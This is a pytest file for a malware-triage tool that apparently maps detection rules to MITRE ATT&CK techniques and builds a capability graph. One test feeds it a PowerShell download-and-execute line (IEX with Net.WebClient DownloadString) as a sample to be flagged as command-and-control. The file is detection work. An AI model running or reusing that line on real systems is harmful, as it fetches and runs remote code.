"""Capability catalogue, rule integrity, and the graph.

The load-bearing test here is `test_every_rule_references_real_techniques`: it is what
lets the report promise that every ATT&CK id it prints is real. If a rule ever cites a
technique that is not in the hand-curated catalogue, this goes red before release.
"""

from __future__ import annotations

from revtriage.capabilities import attack, build_graph
from revtriage.capabilities.rules import CORE_RULES, EXTENDED_RULES, run_rules, validate_rules
from revtriage.model import Match


def test_core_rules_are_internally_sound():
    assert validate_rules(CORE_RULES) == []


def test_extended_rules_are_internally_sound():
    assert validate_rules(EXTENDED_RULES) == []


def test_every_rule_references_real_techniques():
    for rule in CORE_RULES + EXTENDED_RULES:
        for technique in rule.techniques:
            assert technique in attack.TECHNIQUES, f"{rule.id} cites unknown {technique}"


def test_every_rule_capability_exists():
    for rule in CORE_RULES + EXTENDED_RULES:
        assert rule.capability in attack.CAPABILITIES


def test_catalogue_has_no_placeholder_ids():
    for tid, technique in attack.TECHNIQUES.items():
        assert tid.startswith("T") and technique.name and technique.tactic
        assert technique.url.startswith("https://attack.mitre.org/techniques/")


def test_rules_detect_across_layers():
    texts = [("L0", "nothing here"), ("L1", "IEX (New-Object Net.WebClient).DownloadString('http://x')")]
    matches = run_rules(CORE_RULES, texts, imports=[], notes=[])
    # A detection must be attributed to the layer it fired in (L1, not L0).
    assert any(mt.layer == "L1" for mt in matches)
    assert any(mt.capability == "command-and-control" for mt in matches)


def test_symbol_rule_fires_on_imports():
    matches = run_rules(CORE_RULES, [], imports=["kernel32.dll!WriteProcessMemory"], notes=[])
    assert any(mt.rule_id == "inject.remote-thread" for mt in matches)


def test_note_rule_fires_on_structural_note():
    matches = run_rules(CORE_RULES, [], imports=[], notes=["pe:high-entropy-section"])
    assert any(mt.capability == "obfuscation" for mt in matches)


def test_graph_creates_lethal_edge_when_both_present():
    matches = [
        Match("persist.run-key", "persistence", "x", 8, ("T1547.001",), "e", "L0"),
        Match("c2.web", "command-and-control", "x", 6, ("T1071.001",), "e", "L0"),
    ]
    graph = build_graph(matches)
    assert {"persistence", "command-and-control"} <= graph.capability_ids
    assert any({e.source, e.target} == {"persistence", "command-and-control"} for e in graph.edges)


def test_graph_no_edge_when_only_one_side_present():
    matches = [Match("persist.run-key", "persistence", "x", 8, ("T1547.001",), "e", "L0")]
    assert build_graph(matches).edges == []


def test_lethal_combinations_reference_real_capabilities():
    for (first, second), bonus, rationale in attack.LETHAL_COMBINATIONS:
        assert first in attack.CAPABILITIES
        assert second in attack.CAPABILITIES
        assert bonus > 0 and rationale
